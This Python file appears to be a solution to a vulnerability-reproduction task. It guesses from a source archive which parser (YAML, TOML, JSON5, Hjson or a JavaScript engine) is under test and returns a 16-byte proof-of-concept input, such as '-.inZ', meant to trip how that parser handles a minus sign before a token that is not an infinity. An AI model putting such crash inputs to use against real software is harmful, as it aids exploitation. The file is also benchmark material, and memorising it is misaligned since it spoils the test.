import os
import tarfile
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        def read_members_from_tar(path):
            try:
                with tarfile.open(path, mode='r:*') as tf:
                    for m in tf.getmembers():
                        if m.isfile() and (m.size <= 10_000_000):
                            f = tf.extractfile(m)
                            if f:
                                try:
                                    data = f.read()
                                except Exception:
                                    continue
                                yield m.name, data
            except Exception:
                return

        def walk_dir(path):
            for root, _, files in os.walk(path):
                for fn in files:
                    full = os.path.join(root, fn)
                    try:
                        if os.path.getsize(full) <= 10_000_000:
                            with open(full, 'rb') as f:
                                yield full, f.read()
                    except Exception:
                        continue

        def normalize_text(b):
            try:
                return b.decode('utf-8', errors='ignore')
            except Exception:
                try:
                    return b.decode('latin-1', errors='ignore')
                except Exception:
                    return ""

        def detect_project(path):
            scores = {'yaml': 0, 'toml': 0, 'js': 0, 'json5': 0, 'hjson': 0}
            seen_any = False

            if os.path.isdir(path):
                iterator = walk_dir(path)
            else:
                iterator = read_members_from_tar(path)

            for name, data in iterator:
                seen_any = True
                ln = name.lower()
                txt = normalize_text(data)
                ltxt = txt.lower()

                # Boosts by file path hints
                if 'yaml' in ln or 'libyaml' in ltxt or 'yaml-cpp' in ltxt:
                    scores['yaml'] += 50
                if 'toml' in ln or 'toml' in ltxt:
                    scores['toml'] += 40
                if 'json5' in ln or 'json5' in ltxt:
                    scores['json5'] += 40
                if 'hjson' in ln or 'hjson' in ltxt:
                    scores['hjson'] += 40
                if any(x in ln for x in ['duktape', 'quickjs', 'mujs', 'mjs', 'jerry', 'jerryscript']) or any(x in ltxt for x in ['duktape', 'quickjs', 'mujs', 'jerryscript']):
                    scores['js'] += 50

                # Token-based hints
                if '.inf' in ltxt or '.nan' in ltxt:
                    scores['yaml'] += 5
                if 'infinity' in txt or 'Infinity' in txt:
                    scores['js'] += 4
                    scores['json5'] += 3
                    scores['hjson'] += 3
                if 'nan' in ltxt and 'inf' in ltxt and 'toml' in ltxt:
                    scores['toml'] += 6
                if 'nan' in ltxt and 'inf' in ltxt and 'yaml' in ltxt:
                    scores['yaml'] += 6
                if ('Infinity' in txt and 'NaN' in txt) or ('infinity' in ltxt and 'nan' in ltxt):
                    scores['js'] += 4

            if not seen_any:
                return 'yaml'  # fallback

            # Pick the best guess with deterministic priority
            best = max(scores.items(), key=lambda kv: kv[1])[0]
            # If tie or zero, pick priority: yaml > toml > json5 > hjson > js
            if all(v == scores[best] for v in scores.values()):
                return 'yaml'
            if scores[best] == 0:
                return 'yaml'
            return best

        proj = detect_project(src_path)

        # Craft 16-byte PoCs; aim to include a leading '-' before a non-infinity token
        if proj == 'yaml':
            # YAML uses -.inf for infinity; use -.inZ to be "not inf" with leading minus
            poc = b"a: -.inZ\n...\n# \n"  # 16 bytes
            return poc[:16]
        elif proj == 'toml':
            # TOML uses inf/nan; use -inZ to be "not inf" with leading minus
            poc = b"a=-inZ\n# \n# \n"  # 14 bytes, pad to 16
            return (poc + b"  ")[:16]
        elif proj in ('json5', 'hjson'):
            # JSON5/Hjson allow Infinity; use -InfinityX to be "not Infinity" with leading minus
            poc = b"{a:-InfinityX}"  # 14 bytes; pad to 16
            return (poc + b"  ")[:16]
        else:
            # js or unknown: try a JS-like snippet; -InfinityX with trailing comment
            poc = b"-InfinityX\n//\n"  # 14 bytes; pad to 16
            return (poc + b"  ")[:16]